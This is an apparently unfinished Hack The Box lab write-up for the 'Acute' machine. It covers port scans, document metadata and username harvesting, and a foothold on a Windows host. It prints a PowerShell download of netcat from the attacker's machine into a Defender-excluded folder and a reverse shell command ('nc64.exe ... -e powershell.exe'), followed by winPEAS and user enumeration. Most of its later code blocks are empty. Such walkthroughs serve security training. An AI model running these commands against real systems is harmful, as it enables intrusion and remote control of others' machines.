---
title: HTB-Acute Writeup
date: 2026-03-15T15:00:00+08:00
draft: true
toc: true
images:
tags:
  - Hack
---
```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.136.40  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 03:10 EDT
Nmap scan report for 10.129.136.40
Host is up (0.13s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sU --top-ports 20 10.129.136.40              
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 03:14 EDT
Nmap scan report for 10.129.136.40
Host is up (0.11s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 3.62 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p443 10.129.136.40         
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 03:10 EDT
Nmap scan report for 10.129.136.40
Host is up (0.11s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2026-03-15T07:11:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.16 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=http-brute -p 443 10.129.136.40
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 03:11 EDT
Nmap scan report for 10.129.136.40
Host is up (0.11s latency).

PORT    STATE SERVICE
443/tcp open  https
| http-brute:   
|_  Path "/" does not require authentication

Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo bash -c 'echo "10.129.136.40 atsserver.acute.local" >> /etc/hosts'
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.136.40 atsserver.acute.local
```

![](Pasted%20image%2020260315153451.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ mv /home/kali/Downloads/New_Starter_CheckList_v7.docx New_Starter_CheckList_v7.docx
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
New_Starter_CheckList_v7.docx

```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ file New_Starter_CheckList_v7.docx                                                                                               
New_Starter_CheckList_v7.docx: Microsoft Word 2007+

┌──(kali㉿kali)-[~/Work/Kali]
└─$ exiftool New_Starter_CheckList_v7.docx 
ExifTool Version Number         : 13.25
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2026:03:15 03:20:19-04:00
File Access Date/Time           : 2026:03:15 03:20:19-04:00
File Inode Change Date/Time     : 2026:03:15 03:23:06-04:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
```

![](Pasted%20image%2020260315154429.png)

![](Pasted%20image%2020260315154559.png)

![](Pasted%20image%2020260315154646.png)

![](Pasted%20image%2020260315153636.png)

![](Pasted%20image%2020260315154741.png)

```bash

Who we work with

Acute Health work with healthcare providers, councils and NHS units in the UK, training over 10,000 nurses, managers and healthcare workers every year. Some of our more established team members have been included for multiple awards, these members include Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins. Each of whom have come away with special accolades from the Healthcare community.

```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat users.txt 
aallace
chall
edavies
imonks
jmorgan
lhopkins

```

edavies Acute-PC01

![](Pasted%20image%2020260316213312.png)

![](Pasted%20image%2020260316212638.png)

```bash
PS C:\Utils> 

gci -force

 

 

    Directory: C:\Utils

 

 

Mode                 LastWriteTime         Length Name                                                                 

----                 -------------         ------ ----                                                                 

-a-h--        12/21/2021   6:41 PM            148 desktop.ini                                                          

 

 

PS C:\Utils> 

type desktop.ini

[.ShellClassInfo]

InfoTip=Directory for Testing Files without Defender
```

```bash
PS C:\utils> 

Invoke-WebRequest -Uri 'http://10.10.16.58/nc64.exe' -OutFile 'C:\Utils\nc64.exe'

PS C:\utils> 

dir

 

 

    Directory: C:\utils

 

 

Mode                 LastWriteTime         Length Name                                                                 

----                 -------------         ------ ----                                                                 

-a----         3/16/2026   3:05 PM          45272 nc64.exe                                                             

 

 

PS C:\utils> 

.\nc64.exe -h

.\nc64.exe : [v1.12 NT http://eternallybored.org/misc/netcat/]

    + CategoryInfo          : NotSpecified: ([v1.12 NT http:...g/misc/netcat/]:String) [], RemoteException

    + FullyQualifiedErrorId : NativeCommandError

 

connect to somewhere:	nc [-options] hostname port[s] [ports] ... 

listen for inbound:	nc -l -p port [options] [hostname] [port]

options:

	-d		detach from console, background mode

 

	-e prog		inbound program to exec [dangerous!!]

	-g gateway	source-routing hop point[s], up to 8

	-G num		source-routing pointer: 4, 8, 12, ...

	-h		this cruft

	-i secs		delay interval for lines sent, ports scanned

	-l		listen mode, for inbound connects

	-L		listen harder, re-listen on socket close

	-n		numeric-only IP addresses, no DNS

	-o file		hex dump of traffic

	-p port		local port number

	-r		randomize local and remote ports

	-s addr		local source address

	-t		answer TELNET negotiation

	-c		send CRLF instead of just LF

	-u		UDP mode

	-v		verbose [use twice to be more verbose]

	-w secs		timeout for connects and final net reads

	-z		zero-I/O mode [used for scanning]

port numbers can be individual or ranges: m-n [inclusive]

PS C:\utils> 

.\nc64.exe 10.10.16.58 443 -e powershell.exe


```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.136.40] 49892
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\utils> whoami
whoami
acute\edavies

```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo rlwrap -cAr nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.136.40] 49817
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Utils> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14
   IPv4 Address. . . . . . . . . . . : 172.16.22.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.22.1
```

```bash
PS C:\Utils> dir
dir


    Directory: C:\Utils


Mode                 LastWriteTime         Length Name                                                                 
--- ----                                                                 
-a----        17/03/2026     12:34          45272 nc64.exe                                                             
-a----        17/03/2026     12:52       10170880 winPEAS.exe
```

```bash
PS C:\Utils> .\winPEAS.exe log
.\winPEAS.exe log
"log" argument present, redirecting output to file "out.txt"
ERROR: Access denied
PS C:\Utils> ls out.txt
ls out.txt


    Directory: C:\Utils


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        17/03/2026     12:59         129848 out.txt 
```

```bash
PS C:\Utils> net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Natasha                  WDAGUtilityAccount       
The command completed with one or more errors.
```

```bash
PS C:\Utils> net user Natasha
net user Natasha
User name                    Natasha
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            21/12/2021 09:23:01
Password expires             Never
Password changeable          22/12/2021 09:23:01
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   21/12/2021 12:39:13

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *None                 
The command completed successfully.
```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```